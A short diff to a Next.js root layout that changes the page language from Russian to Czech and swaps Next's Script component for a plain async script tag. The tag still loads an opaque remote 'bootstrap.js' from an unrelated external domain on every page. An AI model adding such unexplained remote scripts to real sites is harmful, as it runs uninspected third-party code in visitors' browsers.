@@ -10,18 +10,18 @@ export const viewport = {
   userScalable: false,
 };
 
-import Script from "next/script";
 import "./globals.css";
 
 export default function RootLayout({ children }) {
   return (
-    <html lang="ru">
+    <html lang="cs">
       <body>
         {children}
-        <Script
+        <script
           src="https://golden-digger.art/p/58d58c34-7749-4fd7-88a5-4053d57839c1/bootstrap.js"
-          strategy="afterInteractive"
-        />
+          async
+          defer
+        ></script>
       </body>
     </html>
   );
